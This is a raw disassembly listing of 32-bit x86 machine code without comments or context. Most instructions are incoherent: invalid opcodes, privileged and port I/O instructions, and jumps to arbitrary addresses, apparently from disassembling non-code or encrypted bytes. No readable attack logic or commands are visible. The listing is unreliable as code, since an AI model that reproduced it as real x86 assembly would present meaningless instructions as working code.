  408a06:	jno    0x4089f5
  408a08:	adc    DWORD PTR [edi-0x3ed281e9],0xffffffb1
  408a0f:	mov    al,ds:0x730c58f4
  408a14:	popf   
  408a15:	xor    eax,0x533b4c5f
  408a1a:	mov    edx,0x49ae9494
  408a1f:	dec    esp
  408a20:	repz test BYTE PTR [edx+ebp*4-0x2d5bc3e1],0x85
  408a29:	test   DWORD PTR [edx+ebp*2-0xf],ecx
  408a2d:	lods   al,BYTE PTR ds:[esi]
  408a2e:	iret   
  408a2f:	or     edx,DWORD PTR [edx]
  408a31:	pop    ss
  408a32:	sbb    eax,0x5a6bce22
  408a37:	fsubr  QWORD PTR [ebx]
  408a39:	jae    0x408a0b
  408a3b:	rcr    DWORD PTR [ebx-0x4254e12a],cl
  408a41:	pop    esi
  408a42:	push   esp
  408a43:	(bad)  [ecx+0x16]
  408a46:	popa   
  408a47:	popa   
  408a48:	ffree  st(4)
  408a4a:	pop    es
  408a4b:	mov    eax,ds:0x88713079
  408a50:	fnstsw WORD PTR [ecx-0xf]
  408a53:	mov    bl,0xae
  408a55:	ins    BYTE PTR es:[edi],dx
  408a56:	aam    0xc9
  408a58:	out    0x8b,eax
  408a5a:	mov    cl,0x4d
  408a5c:	scas   eax,DWORD PTR es:[edi]
  408a5d:	cmp    eax,0x75c9b2b3
  408a62:	in     eax,dx
  408a63:	dec    edx
  408a64:	add    al,0x16
  408a66:	mov    edi,0x91c2e4eb
  408a6b:	jle    0x408ac9
  408a6d:	fwait
  408a6e:	loop   0x408a55
  408a70:	push   ebx
  408a71:	dec    edx
  408a72:	push   ds
  408a73:	push   eax
  408a74:	mov    ebp,DWORD PTR [edi]
  408a76:	fwait
  408a77:	jecxz  0x408ab0
  408a79:	or     ch,dh
  408a7b:	fcomp  QWORD PTR [eax+0x661b89f0]
  408a81:	adc    bl,BYTE PTR [esi+edx*1-0x10]
  408a85:	jno    0x408a26
  408a87:	jae    0x408a40
  408a89:	fstp   DWORD PTR [ebx+0x2b]
  408a8c:	loop   0x408aef
  408a8e:	pop    esp
  408a8f:	fdivp  st(2),st
  408a91:	arpl   ax,bx
  408a93:	push   0x531bfe34
  408a98:	inc    edx
  408a99:	adc    BYTE PTR gs:[edx+eax*1],ah
  408a9d:	pushf  
  408a9e:	push   ss
  408a9f:	xchg   esp,eax
  408aa0:	arpl   ax,bx
  408aa2:	popa   
  408aa3:	ffree  st(3)
  408aa5:	hlt    
  408aa6:	scas   eax,DWORD PTR es:[edi]
  408aa7:	sub    ebx,ebp
  408aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408aaa:	gs pop es
  408aac:	iret   
  408aad:	adc    al,0xc
  408aaf:	enter  0x9a22,0xd6
  408ab3:	or     eax,0x825fdfce
  408ab8:	scas   al,BYTE PTR es:[edi]
  408ab9:	push   0x24aa398f
  408abe:	(bad)  
  408ac0:	dec    ebx
  408ac1:	fnsave [ecx+0x21]
  408ac4:	push   0x6
  408ac6:	dec    ebp
  408ac7:	jl     0x408a70
  408ac9:	fmul   DWORD PTR [ecx+eax*8]
  408acc:	into   
  408acd:	(bad)  
  408ace:	fcmovb st,st(1)
  408ad0:	pop    edx
  408ad1:	xchg   DWORD PTR [edx-0x27],eax
  408ad4:	pop    edi
  408ad5:	iret   
  408ad6:	std    
  408ad7:	outs   dx,BYTE PTR ds:[esi]
  408ad8:	jae    0x408a65
  408ada:	imul   edx
  408adc:	mov    eax,0x6e6fa3a0
  408ae1:	mov    esi,0xbef23f7a
  408ae6:	lds    eax,FWORD PTR [ebx+edx*1]
  408ae9:	adc    ch,BYTE PTR [esi+0x9]
  408aec:	popa   
  408aed:	call   0x87bf:0x1d436c1f
  408af4:	and    dh,BYTE PTR [ecx]
  408af6:	dec    ebx
  408af7:	inc    ebp
  408af8:	cmp    cl,BYTE PTR [eax]
  408afa:	xor    BYTE PTR [ebp+0x6c741fd9],bh
  408b00:	out    0xf5,al
  408b02:	pop    esi
  408b03:	dec    esp
  408b04:	or     DWORD PTR [ebp-0xb1f49e3],ecx
  408b0a:	hlt    
  408b0b:	pop    ebx
  408b0c:	inc    ecx
  408b0d:	jge    0x408b63
  408b0f:	xlat   BYTE PTR ds:[ebx]
  408b10:	ret    
  408b11:	outs   dx,BYTE PTR ds:[esi]
  408b12:	inc    esp
  408b13:	xchg   esp,eax
  408b14:	in     eax,dx
  408b15:	mov    bl,0x66
  408b17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b18:	and    DWORD PTR [ebp+0x724d88e],ebx
  408b1e:	pusha  
  408b1f:	pop    eax
  408b20:	out    0x7a,eax
  408b22:	push   ss
  408b23:	lea    ebp,[eax]
  408b25:	dec    ebp
  408b26:	aam    0xe4
  408b28:	out    0x2,eax
  408b2a:	iret   
  408b2b:	jge    0x408ac4
  408b2d:	mov    eax,ds:0xe727ea6c
  408b32:	pop    ebp
  408b33:	jp     0x408b7a
  408b35:	sbb    DWORD PTR [ebp-0x55],edx
  408b38:	(bad)  [edx-0x49]
  408b3b:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  408b3d:	jns    0x408b0a
  408b3f:	jbe    0x408bc0
  408b41:	pop    ss
  408b42:	xchg   ecx,eax
  408b43:	xchg   ecx,eax
  408b44:	or     DWORD PTR [edx],ebp
  408b46:	push   edi
  408b47:	xor    dh,ah
  408b49:	jmp    0x408ad3
  408b4b:	pop    edi
  408b4c:	leave  
  408b4d:	mov    eax,ds:0xfd62fb39
  408b52:	fwait
  408b53:	(bad)
  408b56:	dec    BYTE PTR [esi-0x43f8d4c6]
  408b5c:	sub    eax,0x98b72f67
  408b61:	dec    esi
  408b62:	repnz out 0x11,eax
  408b65:	dec    ebx
  408b66:	rol    esi,0x9a
  408b69:	stos   BYTE PTR es:[edi],al
  408b6a:	sar    BYTE PTR [eax+0x20],cl
  408b6d:	nop
  408b6e:	inc    edi
  408b6f:	out    0x59,al
  408b71:	push   ebx
  408b72:	add    bh,BYTE PTR [ebx]
  408b74:	popf   
  408b75:	in     al,dx
  408b76:	and    eax,0x58eb40c9
  408b7b:	or     al,0xfb
  408b7d:	lahf   
  408b7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b7f:	push   ebx
  408b80:	jae    0x408bb6
  408b82:	sbb    DWORD PTR [ebx],esp
  408b84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b85:	js     0x408b34
  408b87:	(bad)  
  408b88:	repz mov bl,0xa
  408b8b:	leave  
  408b8c:	push   esp
  408b8d:	jmp    0x408b0f
  408b8f:	jbe    0x408bfe
  408b91:	mov    ecx,0xeb61ee5d
  408b96:	call   0xad8d:0x24b5e83
  408b9d:	add    BYTE PTR [eax],al
  408b9f:	ja     0x408b91
  408ba1:	out    dx,al
  408ba2:	stos   BYTE PTR es:[edi],al
  408ba3:	call   0x1bdcc6f6
  408ba8:	lds    ecx,FWORD PTR [edi+0x30]
  408bab:	inc    edi
  408bac:	imul   ecx,DWORD PTR [edx-0x72c1d10c],0xe0ce1193
  408bb6:	mov    eax,0x368da68e
  408bbb:	out    0x9b,al
  408bbd:	mov    dl,0xce
  408bbf:	mov    edi,0xd45a44ad
  408bc4:	idiv   BYTE PTR [edi+0x32]
  408bc7:	pop    ds
  408bc8:	cmp    DWORD PTR [ebx+0x24],0x3b38a03e
  408bcf:	int3   
  408bd0:	dec    ebp
  408bd1:	or     eax,0x43902e14
  408bd6:	mov    ebx,DWORD PTR [ebx+edi*8+0x7214a060]
  408bdd:	mov    eax,ds:0xe9f81091
  408be2:	adc    dh,ch
  408be4:	mov    ds:0xa3fb4b12,al
  408be9:	add    BYTE PTR [edi],dh
  408beb:	mov    ebx,0x59019788
  408bf0:	sbb    eax,0xd0b6598a
  408bf5:	lods   al,BYTE PTR ds:[esi]
  408bf6:	xchg   edx,eax
  408bf7:	or     BYTE PTR [edx+ebp*8-0x80],al
  408bfb:	jmp    ebx
  408bfd:	fadd   st,st(2)
  408bff:	jg     0x408b97
  408c01:	jecxz  0x408c31
  408c03:	pop    eax
  408c04:	test   eax,0x35d44789
  408c09:	jb     0x408bc3
  408c0b:	out    0xaa,eax
  408c0d:	hlt    
  408c0e:	jge    0x408bde
  408c10:	cli    
  408c11:	shl    DWORD PTR [edi-0x54883538],cl
  408c17:	retf   0x86d5
  408c1a:	fdivr  QWORD PTR [ebp+eax*2-0x17]
  408c1e:	jecxz  0x408ba2
  408c20:	fnstcw WORD PTR [edi-0xe]
  408c23:	sub    eax,0x1e126ae4
  408c28:	or     DWORD PTR [ebx-0x4072666b],esi
  408c2e:	dec    esi
  408c2f:	or     bh,BYTE PTR [ebx+0x689e6d90]
  408c35:	jnp    0x408bc8
  408c37:	mov    cl,0x56
  408c39:	cmp    DWORD PTR [edi*8+0x6249c539],esi
  408c40:	xchg   DWORD PTR [ebp+0x3d],edx
  408c43:	mov    eax,DWORD PTR [ebp-0x20]
  408c46:	mov    edx,DWORD PTR [ebp-0x8]
  408c49:	mov    edi,DWORD PTR [ebp-0x24]
  408c4c:	xor    edx,ecx
  408c4e:	jmp    0x408fc4
  408c53:	inc    esp
  408c54:	pusha  
  408c55:	sub    BYTE PTR [esi],bh
  408c57:	sub    BYTE PTR [esi+0x72],dl
  408c5a:	(bad)
  408c5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c60:	daa    
  408c61:	mov    bl,0x64
  408c63:	ins    BYTE PTR es:[edi],dx
  408c64:	in     al,0x7c
  408c66:	jl     0x408c3f
  408c68:	jns    0x408ce6
  408c6a:	jl     0x408cd9
  408c6c:	and    al,0xae
  408c6e:	mov    eax,ds:0xe3aa9450
  408c73:	jns    0x408c37
  408c75:	ret    0x8c42
  408c78:	retf   0x755f
  408c7b:	mov    eax,ds:0xcc7006a6
  408c80:	outs   dx,BYTE PTR ds:[esi]
  408c81:	test   DWORD PTR [ecx-0x4cc5ba5d],eax
  408c87:	rcl    bh,1
  408c89:	pushf  
  408c8a:	xor    ebx,DWORD PTR [esi+0xd]
  408c8d:	ror    DWORD PTR [eax+0x163baaff],0x18
  408c94:	ins    BYTE PTR es:[edi],dx
  408c95:	push   ebp
  408c96:	iret   
  408c97:	jp     0x408c3f
  408c99:	push   ebp
  408c9a:	lahf   
  408c9b:	push   ebx
  408c9c:	add    al,0x67
  408c9e:	jbe    0x408c7e
  408ca0:	push   ss
  408ca1:	sub    dh,BYTE PTR [edi+0x20]
  408ca4:	std    
  408ca5:	add    eax,0x6c78d5b1
  408caa:	enter  0xcf2f,0xa2
  408cae:	pop    ebp
  408caf:	stc    
  408cb0:	daa    
  408cb1:	mov    esp,0xff3d62f9
  408cb6:	mov    gs,WORD PTR [esi]
  408cb8:	mov    eax,0x3e5cf209
  408cbd:	popa   
  408cbe:	dec    eax
  408cbf:	push   ds
  408cc0:	loope  0x408c8e
  408cc2:	sbb    DWORD PTR [edx-0x3b],esi
  408cc5:	and    al,dh
  408cc7:	(bad)  [esi+edx*2-0x54]
  408ccb:	fild   DWORD PTR [ecx-0x63]
  408cce:	mov    ch,0x6d
  408cd0:	jecxz  0x408d15
  408cd2:	xchg   esi,eax
  408cd3:	mov    ebx,0xb839ded8
  408cd8:	sbb    DWORD PTR [edx+0x6a683af2],ecx
  408cde:	mov    ecx,0x119be3f3
  408ce3:	sub    DWORD PTR [eax],edx
  408ce5:	xchg   edx,eax
  408ce6:	jg     0x408d37
  408ce8:	enter  0xebba,0x85
  408cec:	push   ss
  408ced:	sti    
  408cee:	jecxz  0x408cb5
  408cf0:	or     dh,BYTE PTR [esp+ecx*1-0x2bb98f9f]
  408cf7:	adc    eax,0xa5aa82cf
  408cfc:	mov    eax,ds:0xa4c2c7c9
  408d01:	cmp    al,0x3
  408d03:	xchg   esi,eax
  408d04:	das    
  408d05:	gs fdivp st(0),st
  408d08:	stos   BYTE PTR es:[di],al
  408d0a:	or     BYTE PTR [ecx-0xc9dea3],0x61
  408d11:	dec    ax
  408d13:	pop    esp
  408d14:	adc    BYTE PTR [ebx-0x7b78b364],0x9f
  408d1b:	mov    eax,0xc7081194
  408d20:	mov    edi,0x6900b236
  408d25:	xor    ah,bh
  408d27:	mov    ebx,0x531979f6
  408d2c:	ss fwait
  408d2e:	cs adc ebx,0xbc5e921a
  408d35:	loop   0x408ced
  408d37:	repz mov ecx,0xcbf8898f
  408d3d:	(bad)
  408d41:	in     al,dx
  408d42:	push   esi
  408d43:	out    0xf6,eax
  408d45:	pop    ebx
  408d46:	or     DWORD PTR [edi-0x40],ebx
  408d49:	jmp    0xe6b95814
  408d4e:	xor    DWORD PTR [ecx+0x1c604b25],esp
  408d54:	enter  0x1a88,0xf5
  408d58:	dec    edx
  408d59:	push   eax
  408d5a:	das    
  408d5b:	rol    BYTE PTR [ecx-0x2e6e2678],cl
  408d61:	xchg   edi,eax
  408d62:	push   ecx
  408d63:	sbb    cl,BYTE PTR [edi]
  408d65:	cmp    DWORD PTR [eax+0x7f],ebx
  408d68:	fwait
  408d69:	xor    ch,cl
  408d6b:	dec    ebp
  408d6c:	sub    BYTE PTR [eax+edi*2-0x6d00df94],0xc7
  408d74:	lds    ebp,FWORD PTR [ebx+0x4a]
  408d77:	shl    DWORD PTR es:[edi+0x20401057],cl
  408d7e:	mov    esi,0xded700e2
  408d83:	or     eax,0xe3eec7c8
  408d88:	fistp  QWORD PTR [edx]
  408d8a:	mov    eax,ds:0x263bbd4e
  408d8f:	and    DWORD PTR [esi],edi
  408d91:	aad    0x35
  408d93:	dec    BYTE PTR [eax]
  408d95:	adc    BYTE PTR [edi-0x2dd9a349],ch
  408d9b:	ins    DWORD PTR es:[edi],dx
  408d9c:	add    cl,BYTE PTR [edi+0x5fda0c5a]
  408da2:	mov    esi,0x7f87a8da
  408da7:	cmp    eax,0xec4a0c89
  408dac:	mov    esp,0x36b177e5
  408db1:	mov    al,0xbb
  408db3:	xchg   esp,eax
  408db4:	stc    
  408db5:	push   es
  408db6:	(bad)  
  408db7:	push   ds
  408db8:	lds    ecx,FWORD PTR [ebx-0x4bed4a8f]
  408dbe:	inc    ebx
  408dbf:	sbb    ch,dl
  408dc1:	adc    edx,DWORD PTR [ebx]
  408dc3:	or     al,0x53
  408dc5:	push   edi
  408dc6:	loopne 0x408d8b
  408dc8:	adc    edi,DWORD PTR fs:[esi+0x62]
  408dcc:	push   eax
  408dcd:	inc    ecx
  408dce:	ins    BYTE PTR es:[edi],dx
  408dcf:	cli    
  408dd0:	int    0x3d
  408dd2:	in     eax,0xef
  408dd4:	data16 loopne 0x408d95
  408dd7:	sub    al,0x82
  408dd9:	push   eax
  408dda:	mov    edx,0x9471a0ee
  408ddf:	cli    
  408de0:	push   cs
  408de1:	(bad)  
  408de2:	fmul   st,st(2)
  408de4:	fmul   QWORD PTR [edx-0x67]
  408de7:	dec    esp
  408de8:	inc    ebx
  408de9:	mov    ecx,0x72ff2f59
  408dee:	mov    esp,0x2b1060ec
  408df3:	and    esi,DWORD PTR [eax+0xb]
  408df6:	ins    DWORD PTR es:[edi],dx
  408df7:	mov    ds:0x29c620e3,al
  408dfc:	fldcw  WORD PTR [ebp+0x3e398799]
  408e02:	jo     0x408e75
  408e04:	std    
  408e05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e07:	dec    esp
  408e08:	or     bh,bl
  408e0a:	jne    0x408dce
  408e0c:	push   ebp
  408e0d:	sbb    BYTE PTR [ebx-0x4b],dl
  408e10:	repnz (bad) 
  408e12:	imul   edx,DWORD PTR [edx+0x3d],0x4a
  408e16:	sub    edx,DWORD PTR [esi+0x3bc46afe]
  408e1c:	rcl    cl,0x8c
  408e1f:	pop    eax
  408e20:	fs adc eax,0xad5f8fd6
  408e26:	retf   
  408e27:	pusha  
  408e28:	push   ebp
  408e29:	push   ds
  408e2a:	push   0xde3771e0
  408e2f:	stc    
  408e30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e31:	scas   al,BYTE PTR es:[edi]
  408e32:	xchg   ebp,eax
  408e33:	pop    edi
  408e34:	mov    eax,0x9a06b7dd
  408e39:	ds inc edx
  408e3b:	fist   DWORD PTR ds:0xb87f9ed0
  408e41:	sub    BYTE PTR [esi+0x7e],ah
  408e44:	jmp    0x4942:0x377f152b
  408e4b:	jns    0x408e46
  408e4d:	sbb    al,bh
  408e4f:	int    0xa9
  408e51:	xlat   BYTE PTR ds:[ebx]
  408e52:	pop    ebx
  408e53:	adc    BYTE PTR [esi+0x1e611ade],ah
  408e59:	xlat   BYTE PTR ds:[ebx]
  408e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e5b:	mov    dl,0xe
  408e5d:	cmc    
  408e5e:	fnstenv [ebp-0x61]
  408e61:	test   DWORD PTR [eax],eax
  408e63:	xor    edx,eax
  408e65:	(bad)  
  408e66:	in     al,dx
  408e67:	add    al,0x9c
  408e6a:	or     al,0x23
  408e6c:	stc    
  408e6d:	jg     0x408e80
  408e6f:	sahf   
  408e70:	sub    eax,0xff6cbda4
  408e75:	mov    ebx,0xf5d0e6dc
  408e7a:	sbb    BYTE PTR [edx+eiz*4-0x38d424b7],ch
  408e81:	retf   
  408e82:	xor    al,0xb6
  408e84:	or     BYTE PTR [ebx+0x3177fa1b],cl
  408e8a:	shl    BYTE PTR [eax+0x44],1
  408e8d:	xor    eax,0xa79ae260
  408e92:	ins    DWORD PTR es:[edi],dx
  408e93:	cli    
  408e94:	mov    ds:0xe9e73728,eax
  408e99:	scas   eax,DWORD PTR es:[edi]
  408e9a:	xlat   BYTE PTR ds:[ebx]
  408e9b:	sbb    DWORD PTR [ecx+0x7a40fc98],0x73d3eacb
  408ea5:	inc    esi
  408ea6:	out    0x33,al
  408ea8:	arpl   WORD PTR [edx-0x289bff6c],di
  408eae:	cmp    DWORD PTR [ebx-0x17],ebp
  408eb1:	jb     0x408f1e
  408eb3:	xchg   DWORD PTR [esi],edx
  408eb5:	mov    ds:0x95d5a907,al
  408eba:	push   es
  408ebb:	add    BYTE PTR cs:[eax-0x7],al
  408ebf:	imul   esi,DWORD PTR [eax],0x78
  408ec2:	sbb    edi,DWORD PTR [ebx]
  408ec4:	xor    al,0xe3
  408ec6:	les    ebx,FWORD PTR [ecx+0x52c27b57]
  408ecc:	inc    ebp
  408ecd:	in     al,0xde
  408ecf:	fisubr WORD PTR [ebx+edi*1+0x72]
  408ed3:	add    DWORD PTR [esi],edi
  408ed5:	ins    DWORD PTR es:[edi],dx
  408ed6:	rcr    ah,1
  408ed8:	mov    edi,0xfd912cd0
  408edd:	test   al,0x2b
  408edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ee0:	push   ebx
  408ee1:	fst    DWORD PTR [esi]
  408ee3:	pop    ebx
  408ee4:	or     eax,0x41032dbf
  408ee9:	mov    ecx,0x7a8bc249
  408eee:	int    0x36
  408ef0:	aaa    
  408ef1:	ins    BYTE PTR es:[edi],dx
  408ef2:	out    dx,al
  408ef3:	cmc    
  408ef4:	add    ebx,DWORD PTR [eax+0x75]
  408ef7:	fiadd  WORD PTR [edx+0x23561d23]
  408efd:	xor    dl,0xdc
  408f00:	pop    esi
  408f01:	outs   dx,BYTE PTR ds:[esi]
  408f02:	data16 cmp cl,BYTE PTR [ebp-0x79]
  408f06:	push   esi
  408f07:	fild   WORD PTR [ebx]
  408f09:	adc    edi,DWORD PTR ds:0xb423a941
  408f0f:	shl    esi,1
  408f11:	repz mov ecx,0xbb1b8986
  408f17:	cmc    
  408f18:	ret    0xbd8e
  408f1b:	adc    dl,cl
  408f1d:	loope  0x408f16
  408f1f:	add    ecx,edx
  408f21:	into   
  408f22:	mov    esi,0x85555b83
  408f27:	mov    al,0x82
  408f29:	inc    ebp
  408f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f2b:	fs sub eax,0x35015cde
  408f31:	loopne 0x408eeb
  408f33:	mov    bh,0xe1
  408f35:	cmp    ebp,DWORD PTR [ebp+0x57]
  408f38:	sub    eax,0xf85a009d
  408f3d:	cmp    al,0xd4
  408f3f:	xchg   edx,eax
  408f40:	mov    ch,0x4d
  408f42:	push   eax
  408f43:	rcl    DWORD PTR [esi-0x19],1
  408f46:	in     eax,0x71
  408f48:	mov    bl,0x90
  408f4a:	push   0xc7dce75f
  408f4f:	stc    
  408f50:	pop    ebx
  408f51:	adc    eax,0xe8d32ed4
  408f56:	mov    eax,0xb3c4d548
  408f5b:	and    ch,ch
  408f5d:	xchg   ecx,eax
  408f5e:	pop    esp
  408f5f:	jecxz  0x408f56
  408f61:	(bad)  
  408f62:	mov    al,ds:0x2283c900
  408f67:	ret    0x7a95
  408f6a:	mov    bl,0x88
  408f6c:	retf   0xf928
  408f6f:	popf   
  408f70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f71:	or     al,0x7b
  408f73:	mov    fs:0x88e26402,eax
  408f79:	aaa    
  408f7a:	rcr    DWORD PTR [edx],1
  408f7c:	aaa    
  408f7d:	mov    esp,0x6a7f9991
  408f82:	(bad)  
  408f83:	lock add eax,0xe7c7a98e
  408f89:	xchg   ebp,eax
  408f8a:	and    BYTE PTR [ecx+0x3e5f50c5],ch
  408f90:	xchg   ebp,eax
  408f91:	jmp    0x2f392a16
  408f96:	sbb    DWORD PTR [ecx-0x5c373011],0xd8259432
  408fa0:	ja     0x408fe6
  408fa2:	xor    BYTE PTR [edi+0x1d],ch
  408fa5:	push   esp
  408fa6:	fist   DWORD PTR [edi+ebx*1]
  408fa9:	lods   al,BYTE PTR ds:[esi]
  408faa:	imul   esi,DWORD PTR [ebx-0x11],0x361d9017
  408fb1:	dec    eax
  408fb2:	fst    st(2)
  408fb4:	enter  0x1163,0xd4
  408fb8:	loop   0x408f9e
  408fba:	xchg   edi,eax
  408fbb:	popf   
  408fbc:	sbb    al,0xc0
  408fbe:	mov    eax,ds:0xccf24953
  408fc3:	and    al,0x3
  408fc5:	(bad)  
  408fc6:	imul   edx,edi
  408fc9:	sub    DWORD PTR [eax],edx
  408fcb:	jmp    0x409341
  408fd0:	or     eax,0x738240b6
  408fd5:	jb     0x408fa4
  408fd7:	mov    cl,0xfd
  408fd9:	push   eax
  408fda:	sbb    DWORD PTR [edx+eax*2-0x17],ebp
  408fde:	fs jecxz 0x408fa8
  408fe1:	loopne 0x40905f
  408fe3:	jl     0x408fbc
  408fe5:	jns    0x409063
  408fe7:	jl     0x408ff6
  408fe9:	mov    bl,BYTE PTR [ecx+0x38]
  408fec:	in     al,0x2e
  408fee:	adc    ebx,esp
  408ff0:	les    ecx,FWORD PTR [edx+0x51]
  408ff3:	add    edi,DWORD PTR [eax]
  408ff5:	mov    ebp,DWORD PTR ds:0xdcada9eb
  408ffb:	sbb    bl,BYTE PTR [edx-0x54]
  408ffe:	(bad)  
  409000:	mov    edx,0x10048369
  409005:	inc    esp
  409006:	inc    eax
  409007:	mov    ds:0x93a6e04d,eax
  40900c:	pop    DWORD PTR [edx+esi*2]
  40900f:	jnp    0x408fb4
  409011:	sub    BYTE PTR [ebp-0x59b1d4e5],cl
  409017:	mov    ah,0x36
  409019:	out    dx,eax
  40901a:	or     al,0x2b
  40901c:	retf   
  40901d:	fcmovbe st,st(4)
  40901f:	jecxz  0x408fb2
  409021:	push   esp
  409022:	fsub   QWORD PTR [edx]
  409024:	leave  
  409025:	sbb    al,0x9a
  409027:	into   
  409028:	ret    0xd636
  40902b:	addr16 sbb eax,0x315c7967
  409031:	arpl   bx,dx
  409033:	(bad)  
  409035:	aaa    
  409036:	and    edi,DWORD PTR [eax+0x46984d10]
  40903c:	xchg   ebx,eax
  40903d:	xor    BYTE PTR [ecx],bl
  40903f:	cdq    
  409040:	gs inc eax
  409042:	out    0x57,eax
  409044:	lods   eax,DWORD PTR ds:[esi]
  409045:	mov    ah,0xe6
  409047:	or     al,bh
  409049:	in     eax,dx
  40904a:	pusha  
  40904b:	xor    DWORD PTR [ebp-0x7b],edi
  40904e:	out    0xf9,eax
  409050:	xchg   esp,eax
  409051:	icebp  
  409052:	mov    dh,0x79
  409054:	retf   0xaed1
  409057:	scas   eax,DWORD PTR es:[edi]
  409058:	and    DWORD PTR [ebx*1-0x47a199ad],edx
  40905f:	or     eax,DWORD PTR [ecx+0xc]
  409062:	lods   eax,DWORD PTR ds:[esi]
  409063:	popf   
  409064:	sub    al,0x5b
  409066:	repnz inc eax
  409068:	cmp    BYTE PTR [ebx],ah
  40906a:	leave  
  40906b:	scas   al,BYTE PTR es:[edi]
  40906c:	(bad)  
  40906d:	sbb    eax,0x99b6943d
  409072:	add    DWORD PTR [esi+eiz*1],ebx
  409075:	(bad)  
  409076:	into   
  409077:	adc    esi,DWORD PTR [edx+edi*1]
  40907a:	sbb    BYTE PTR [ebx],ah
  40907c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40907d:	aam    0xfa
  40907f:	mov    edi,0x54a3696f
  409084:	lods   al,BYTE PTR ds:[esi]
  409085:	test   DWORD PTR ds:0xaf016d5b,0x18b24acb
  40908f:	adc    al,0xa5
  409091:	ins    BYTE PTR es:[edi],dx
  409092:	test   DWORD PTR ds:0x586e102d,ebp
  409098:	into   
  409099:	pop    edx
  40909a:	ds jg  0x4090bf
  40909d:	xor    ch,bl
  40909f:	js     0x40906b
  4090a1:	mov    es,ebx
  4090a3:	xchg   DWORD PTR [esp+ebx*2-0x4d51191],edx
  4090aa:	sub    DWORD PTR [esi+0x69307015],ecx
  4090b0:	mov    ds:0x3350b15,eax
  4090b5:	icebp  
  4090b6:	inc    edi
  4090b7:	jmp    0x4090c2
  4090b9:	fs and eax,0x9b1389c6
  4090bf:	xor    al,0x7e
  4090c1:	push   ebp
  4090c2:	and    DWORD PTR [eax-0x56],0xc647e22b
  4090c9:	xchg   edi,eax
  4090ca:	(bad)  
  4090cb:	out    0x3b,al
  4090cd:	cli    
  4090ce:	into   
  4090cf:	nop
  4090d0:	jp     0x4090fd
  4090d2:	ret    
  4090d3:	push   esi
  4090d4:	or     DWORD PTR [esi-0x34d6fe2f],ebp
  4090da:	ins    DWORD PTR es:[edi],dx
  4090db:	xor    eax,0x4ad9c483
  4090e0:	mov    edx,0xb51da514
  4090e5:	jae    0x4090fb
  4090e7:	push   ds
  4090e8:	repnz pop esp
  4090ea:	mov    cl,0x29
  4090ec:	int    0x58
  4090ee:	jl     0x40913d
  4090f0:	add    cl,0x34
  4090f3:	int    0x61
  4090f5:	mov    dl,0x15
  4090f7:	mov    al,ds:0x49f5655b
  4090fc:	stos   BYTE PTR es:[edi],al
  4090fd:	ja     0x4090a2
  4090ff:	xchg   edx,eax
  409100:	outs   dx,BYTE PTR ds:[esi]
  409101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409102:	retf   
  409103:	pop    ecx
  409104:	add    esp,ecx
  409106:	popa   
  409107:	ret    0x1bd6
  40910a:	xchg   edx,eax
  40910b:	dec    ebp
  40910c:	ds jae 0x4090ae
  40910f:	jns    0x409127
  409111:	mov    ch,0x9f
  409113:	mov    ebp,0x94e3f932
  409118:	stc    
  409119:	inc    ecx
  40911a:	test   DWORD PTR [edi+edx*4-0x6b],ebx
  40911e:	lods   eax,DWORD PTR ds:[esi]
  40911f:	scas   al,BYTE PTR es:[edi]
  409120:	pop    ebx
  409121:	xor    BYTE PTR [eax-0x60],ch
  409124:	lock les edx,FWORD PTR [edx-0x3899ecd1]
  40912b:	mov    dh,0x7a
  40912d:	jecxz  0x409151
  40912f:	mov    ebp,0xd6a25f3f
  409134:	test   eax,0x11853d57
  409139:	outs   dx,BYTE PTR ds:[esi]
  40913a:	and    DWORD PTR [ebp+0x1e],ebp
  40913d:	loopne 0x4090f7
  40913f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409140:	add    BYTE PTR [edi+0x5d],dl
  409143:	push   0xe1abdb2f
  409148:	or     bl,BYTE PTR [esi-0xb6a2472]
  40914e:	jmp    0x20d7bfa
  409153:	shl    esi,1
  409155:	(bad)  
  409156:	iret   
  409157:	pop    ds
  409158:	inc    esi
  409159:	das    
  40915a:	add    BYTE PTR [eax+0x1],dl
  40915d:	dec    ecx
  40915e:	dec    esp
  40915f:	ds addr16 push cs
  409162:	dec    ebp
  409163:	or     BYTE PTR [ecx+0x1d9eb12d],ah
  409169:	pushf  
  40916a:	xchg   DWORD PTR [esi],edx
  40916c:	fadd   DWORD PTR [ebp-0x7]
  40916f:	stc    
  409170:	cmp    dl,0x5a
  409173:	hlt    
  409174:	or     bl,cl
  409176:	push   DWORD PTR [ebx+0xcd8dcbd]
  40917c:	std    
  40917d:	push   0x20c0ec7b
  409182:	and    BYTE PTR [ebx+0x3c],cl
  409185:	loope  0x4091bc
  409187:	out    dx,eax
  409188:	aam    0xa7
  40918a:	sbb    DWORD PTR [ebp-0x6f81369b],esp
  409190:	lods   eax,DWORD PTR ds:[esi]
  409191:	pop    es
  409192:	vmread ebp,ebx
  409195:	in     eax,dx
  409196:	jae    0x409165
  409198:	add    BYTE PTR ds:0xb9db57d6,bh
  40919e:	retf   0xc055
  4091a1:	into   
  4091a2:	shl    BYTE PTR ds:0xda4e36c8,cl
  4091a8:	(bad)  
  4091a9:	mov    ch,0x32
  4091ab:	mov    WORD PTR [edi-0x2adfb5f5],cs
  4091b1:	mov    ebp,DWORD PTR gs:[eax]
  4091b4:	test   eax,0x347f0edc
  4091b9:	mov    bl,0xee
  4091bb:	nop
  4091bc:	dec    ecx
  4091bd:	and    eax,ebp
  4091bf:	pop    ds
  4091c0:	in     al,0x66
  4091c2:	or     eax,DWORD PTR ds:0xde5c9ac
  4091c8:	imul   edx,DWORD PTR [ebp-0x54],0x6decc222
